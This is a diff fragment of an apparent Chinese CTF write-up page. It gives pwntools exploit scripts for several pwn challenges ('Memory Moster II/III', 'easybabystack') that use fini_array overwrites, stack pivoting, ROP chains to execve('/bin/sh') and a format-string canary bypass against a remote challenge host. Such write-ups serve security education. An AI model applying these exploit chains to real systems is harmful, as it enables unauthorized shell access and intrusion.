+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name?&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1">#bypass secret</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Secret&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;JOB&#39;</span><span class="p">)</span>
+    <span class="n">times</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;TIMES&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;TIMES&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">))</span>
+    <span class="nb">print</span> <span class="n">times</span>
+    <span class="k">if</span> <span class="n">times</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">break</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Secret&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Secret&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<h3 id="memory-moster-ii">Memory Moster Ⅱ<a class="headerlink" href="#memory-moster-ii" title="Permanent link">&para;</a></h3>
+<p>利用程序从main函数结束后会调用fini_array里面的函数，来栈迁移进而写ROP，获取shell。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;183.129.189.60&#39;</span><span class="p">,</span><span class="mi">10081</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="c1"># gdb.attach(sh,&#39;&#39;&#39;</span>
+<span class="c1"># b*0x0000000000401746</span>
+<span class="c1"># c</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+<span class="k">def</span> <span class="nf">modify_fini</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;addr:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;data:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">fini_array</span><span class="o">=</span><span class="mh">0x00000000004B80B0</span>
+<span class="n">main</span><span class="o">=</span><span class="mh">0x0000000000401C1D</span>
+<span class="n">libc_fini</span><span class="o">=</span><span class="mh">0x0000000000402CB0</span>
+<span class="n">rdx_ret</span><span class="o">=</span><span class="mh">0x0000000000448415</span> 
+<span class="n">rsi_ret</span><span class="o">=</span><span class="mh">0x0000000000406f80</span>
+<span class="n">rdi_ret</span><span class="o">=</span><span class="mh">0x0000000000401746</span>
+<span class="n">rax_ret</span><span class="o">=</span><span class="mh">0x0000000000448fcc</span> 
+<span class="n">bss</span><span class="o">=</span><span class="mh">0x0000000004C0790</span><span class="o">+</span><span class="mh">0x10</span>
+<span class="n">system</span><span class="o">=</span><span class="mh">0x0000000000410A50</span>
+<span class="n">read</span><span class="o">=</span><span class="mh">0x000000000448400</span>
+<span class="n">ret</span><span class="o">=</span><span class="mh">0x0000000000401016</span> 
+<span class="n">leave</span><span class="o">=</span><span class="mh">0x0000000000401CF3</span>
+<span class="n">syscall</span><span class="o">=</span><span class="mh">0x44840c</span> 
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_fini</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">))</span>
+<span class="c1">#read(0,bss,0x10)</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x10</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x40</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">))</span>
+<span class="c1">#execve(&#39;bin/sh&#39;,0,0)</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x50</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x70</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x80</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x90</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
+<span class="c1">#stack pivoit</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<h3 id="memory-mosteriii">Memory MosterⅢ<a class="headerlink" href="#memory-mosteriii" title="Permanent link">&para;</a></h3>
+<p>原理和上一题相同，exp也是类似，知识gadget有一点区别。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;183.129.189.60&#39;</span><span class="p">,</span><span class="mi">10081</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="c1"># gdb.attach(sh,&#39;&#39;&#39;</span>
+<span class="c1"># b*0x0000000000401746</span>
+<span class="c1"># c</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+<span class="k">def</span> <span class="nf">modify_fini</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;addr:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;data:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">fini_array</span><span class="o">=</span><span class="mh">0x00000000004B50B0</span>
+<span class="n">main</span><span class="o">=</span><span class="mh">0x0000000000401C1D</span>
+<span class="n">libc_fini</span><span class="o">=</span><span class="mh">0x0000000000402CA0</span>
+<span class="n">rdx_ret</span><span class="o">=</span><span class="mh">0x0000000000447635</span>
+<span class="n">rsi_ret</span><span class="o">=</span><span class="mh">0x0000000000406f70</span>
+<span class="n">rdi_ret</span><span class="o">=</span><span class="mh">0x0000000000401746</span> 
+<span class="n">rax_ret</span><span class="o">=</span><span class="mh">0x000000000044806c</span>
+<span class="n">bss</span><span class="o">=</span><span class="mh">0x00000000004BD790</span><span class="o">+</span><span class="mh">0x10</span>
+<span class="n">read</span><span class="o">=</span><span class="mh">0x0000000000447620</span>
+<span class="n">ret</span><span class="o">=</span><span class="mh">0x0000000000401016</span> 
+<span class="n">leave</span><span class="o">=</span><span class="mh">0x0000000000401CF3</span>
+<span class="n">syscall</span><span class="o">=</span><span class="mh">0x44762c</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_fini</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">))</span>
+<span class="c1">#read(0,bss,0x10)</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x10</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x40</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">))</span>
+<span class="c1">#execve(&#39;bin/sh&#39;,0,0)</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x50</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x70</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x80</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">rax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">))</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="o">+</span><span class="mh">0x90</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
+<span class="c1">#stack pivoit</span>
+<span class="n">modify_fini</span><span class="p">(</span><span class="n">fini_array</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<h3 id="easybabystack">easybabystack<a class="headerlink" href="#easybabystack" title="Permanent link">&para;</a></h3>
+<p>这道题利用了格式化字符串*的特性。</p>
+<p>*可以用参数来计算占位符的宽度。如:%*2$c，就是用第二个参数的值来决定这个格式化字符的宽度。利用这一特性我们就可以输出和canary一样大小的字符进而用%n修改变量来bypass。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;183.129.189.60&#39;</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./easybabystack&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="c1"># gdb.attach(sh,&#39;&#39;&#39;</span>
+<span class="c1"># b*0x00000000004016C7</span>
+<span class="c1"># c</span>
+<span class="c1">#   &#39;&#39;&#39;)</span>
+<span class="n">start</span><span class="o">=</span><span class="mh">0x0000000000401710</span>
+<span class="n">pop6_ret</span><span class="o">=</span><span class="mh">0x00000000040172A</span>
+<span class="n">read_plt</span><span class="o">=</span><span class="mh">0x0000000000404038</span>
+<span class="n">bss</span><span class="o">=</span><span class="mh">0x00000000004040C8</span><span class="o">+</span><span class="mh">0x10</span>
+<span class="n">system</span><span class="o">=</span><span class="mh">0x000000000401040</span>
+<span class="n">rdi_ret</span><span class="o">=</span><span class="mh">0x0000000000401733</span>
+<span class="k">def</span> <span class="nf">make_payload</span><span class="p">(</span><span class="n">rdi</span><span class="p">,</span><span class="n">rsi</span><span class="p">,</span><span class="n">rdx</span><span class="p">,</span><span class="n">addr</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop6_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">start</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
+    <span class="k">return</span> <span class="n">p</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name:&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%*18$c%5$n&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;passwd:&#39;</span><span class="p">)</span>
+<span class="n">a</span><span class="o">=</span><span class="mh">0xfe</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;message:&#39;</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x118</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">make_payload</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">bss</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="n">read_plt</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
                 
               
